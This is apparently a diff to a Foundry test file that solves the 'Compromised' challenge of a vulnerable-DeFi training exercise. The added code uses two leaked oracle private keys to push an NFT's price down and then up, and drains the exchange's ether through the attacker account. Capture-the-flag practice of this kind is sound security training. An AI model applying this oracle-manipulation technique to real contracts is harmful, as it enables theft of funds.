@@ -76,7 +76,45 @@ contract Compromised is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        // private key oracle 1
+        address oracle1 = vm.addr(
+            0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
+        );
+        emit log_named_address("oracle1:", oracle1);
+        // private key oracle 2
+        address oracle2 = vm.addr(
+            0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
+        );
+        emit log_named_address("oracle2:", oracle2);
+        // post prices of 0 to oracle
+        vm.prank(oracle1);
+        trustfulOracle.postPrice("DVNFT", 0.1 ether);
+        vm.prank(oracle2);
+        trustfulOracle.postPrice("DVNFT", 0.1 ether);
+        // we can now buy an NFT for 0.1 ether with attacker
+        vm.prank(attacker);
+        uint256 tokenId = exchange.buyOne{value: 0.1 ether}();
+        // post new prices
+        vm.prank(oracle1);
+        trustfulOracle.postPrice(
+            "DVNFT",
+            EXCHANGE_INITIAL_ETH_BALANCE + 0.1 ether
+        );
+        vm.prank(oracle2);
+        trustfulOracle.postPrice(
+            "DVNFT",
+            EXCHANGE_INITIAL_ETH_BALANCE + 0.1 ether
+        );
+        // sell nft as attacker
+        vm.startPrank(attacker);
+        damnValuableNFT.approve(address(exchange), 0);
+        exchange.sellOne(tokenId);
+        vm.stopPrank();
+        // post prices back to normal
+        vm.prank(oracle1);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.prank(oracle2);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
         /** EXPLOIT END **/
         validation();
     }
